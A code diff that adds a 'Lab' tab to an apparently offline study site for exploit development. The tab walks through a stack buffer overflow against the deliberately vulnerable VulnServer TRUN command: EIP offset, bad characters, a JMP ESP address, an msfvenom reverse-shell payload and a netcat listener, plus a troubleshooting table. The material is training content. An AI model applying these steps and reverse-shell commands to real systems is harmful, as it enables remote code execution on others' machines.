@@ -142,6 +142,8 @@ pre .s{color:var(--accent-2)}
   width:44%; font-size:.78rem}
 .cht td:last-child{color:var(--muted-fg)}
 .nores{color:var(--muted-fg); text-align:center; padding:26px; font-size:.9rem}
+#fixbox td:first-child{white-space:normal; color:var(--text); font-family:var(--sans);
+  font-size:.82rem; font-weight:600; width:42%}
 
 /* flashcards */
 .fc-bar{display:flex; align-items:center; gap:10px; flex-wrap:wrap; margin-bottom:14px}
@@ -217,6 +219,7 @@ footer{margin-top:34px; text-align:center; color:var(--muted-fg); font-size:.78r
     <button role="tab" aria-selected="false" data-tab="cheats">Cheats</button>
     <button role="tab" aria-selected="false" data-tab="cards">Flashcards</button>
     <button role="tab" aria-selected="false" data-tab="playbooks">Playbooks</button>
+    <button role="tab" aria-selected="false" data-tab="lab">Lab</button>
   </nav>
 </header>
 
@@ -296,6 +299,24 @@ footer{margin-top:34px; text-align:center; color:var(--muted-fg); font-size:.78r
     <h2 class="sec">Playbooks</h2>
     <p class="lede">The condensed version. The full text lives in <code>00-methodology/</code>.</p>
     <div id="pbbox"></div>
+  </section>
+
+  <!-- LAB -->
+  <section id="lab" class="hidden">
+    <p class="eyebrow">see one exploit end to end</p>
+    <h2 class="sec">Worked Example — VulnServer TRUN</h2>
+    <p class="lede">A textbook stack BOF, DEP off. Build it once in your lab, then hide
+      this and redo from memory. Full version: <code>05-labs/</code>.</p>
+    <div class="panel" style="margin-bottom:16px">
+      <p class="eyebrow" style="color:var(--accent-2)">the one rule that saves runs</p>
+      <p style="margin:0 0 8px"><b>Prove control before perfecting the payload.</b>
+        Drop <code>\xcc\xcc\xcc\xcc</code> (int3) as the shellcode. If WinDbg breaks
+        exactly where ESP pointed, your offset + jump are correct and any remaining
+        failure is <b>in the shellcode</b> (badchars/encoding). This split saves hours.</p>
+    </div>
+    <div id="labsteps"></div>
+    <p class="eyebrow" style="margin-top:22px">stuck &gt;30 min? symptom → fix</p>
+    <div id="fixbox"></div>
   </section>
 
   <footer>keep it offline · keep it in your lab VM · make it yours</footer>
@@ -436,6 +457,28 @@ const PLAYBOOKS=[
  ],gotcha:"Some CRTs disable %n. If it no-ops you may be limited to reads — still enough to beat ASLR."}
 ];
 
+const LABSTEPS=[
+ ["Attach & confirm","WinDbg attach → <code>g</code>. From Kali <code>nc -vn ip 9999</code> → banner. TRUN takes: <code>TRUN /.:/ &lt;data&gt;</code>."],
+ ["Fuzz to crash","Grow the data ~200 at a time. Dies ~2000 bytes. <code>r</code> → EIP = 41414141. Stack BOF."],
+ ["Offset to EIP","<code>msf-pattern_create -l 2000</code> → send → <code>msf-pattern_offset -q &lt;EIP&gt;</code> → <b>2003</b>. (Or <code>mona findmsp</code>.)"],
+ ["Confirm control","<code>A*2003 + BBBB + C…</code> → EIP = 42424242. <code>dd esp</code> shows your C's = landing zone."],
+ ["Bad chars","<code>mona bytearray -b \"\\x00\"</code> → send at ESP → <code>mona compare -f … -a &lt;esp&gt;</code>. TRUN: only <code>\\x00</code>."],
+ ["Find JMP ESP","<code>mona jmp -r esp -cpb \"\\x00\"</code> → essfunc.dll <b>0x625011AF</b>. Pack little-endian: <code>\\xaf\\x11\\x50\\x62</code>."],
+ ["Shellcode","<code>msfvenom -p windows/shell_reverse_tcp LHOST=… LPORT=443 -f python -b \"\\x00\" EXITFUNC=thread</code>."],
+ ["Assemble & fire","<code>TRUN /.:/ + A*2003 + p32(0x625011af) + NOP*16 + shellcode</code>. Listener first: <code>nc -lvnp 443</code>."]
+];
+const FIXES=[
+ ["EIP close but not 42424242","Offset off by a few — re-run mona findmsp, mind protocol prefixes."],
+ ["Shellcode runs then dies (garbage in mem)","A badchar truncated it. Redo bytearray/compare; trust the FIRST bad byte."],
+ ["Small payload works, real one fails","Real shellcode has a badchar the test lacked. Regenerate msfvenom with full -b."],
+ ["Jump never lands","Address has a badchar, or wrong endianness. mona jmp -cpb + struct.pack('<I',a)."],
+ ["Works once, breaks after reboot","ASLR — module rebased. Use -cm aslr=false or leak a base."],
+ ["Land in bytes, few instrs, then AV","DEP on. Build a ROP chain (mona rop). mona mod → NXCompat=True confirms."],
+ ["Encoded shellcode self-corrupts","Decoder writes near itself — add NOPs / sub esp for breathing room."],
+ ["!py mona errors / pykd won't load","Arch mismatch — match WinDbg (x86/x64) to the target."],
+ ["Works attached, fails standalone","Missed badchar, or addr shifts without attach. Re-verify badchars."]
+];
+
 /* ---------- render ---------- */
 const $=s=>document.querySelector(s), $$=s=>[...document.querySelectorAll(s)];
 
@@ -460,13 +503,19 @@ function renderCheats(q=""){
 }
 function esc(s){return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");}
 
+$("#labsteps").innerHTML=`<div class="loop">`+LABSTEPS.map((s,i)=>
+ `<div class="step"><span class="n">${i+1}</span><div><h3>${s[0]}</h3><p>${s[1]}</p></div></div>`).join("")+`</div>`;
+
+$("#fixbox").innerHTML=`<div class="cht"><table><tbody>`+FIXES.map(f=>
+ `<tr><td>${esc(f[0])}</td><td>${f[1]}</td></tr>`).join("")+`</tbody></table></div>`;
+
 $("#pbbox").innerHTML=PLAYBOOKS.map(p=>
  `<details class="pb"><summary>${p.name}<span class="chev">›</span></summary>
   <div class="body"><ol>${p.steps.map(s=>`<li>${s}</li>`).join("")}</ol>
   <div class="gotcha"><b>Gotcha —</b> ${p.gotcha}</div></div></details>`).join("");
 
 /* ---------- tabs ---------- */
-const SECS=["loop","triage","cheats","cards","playbooks"];
+const SECS=["loop","triage","cheats","cards","playbooks","lab"];
 function show(tab){
  SECS.forEach(s=>$("#"+s).classList.toggle("hidden",s!==tab));
  $$("nav.tabs button").forEach(b=>b.setAttribute("aria-selected",b.dataset.tab===tab));
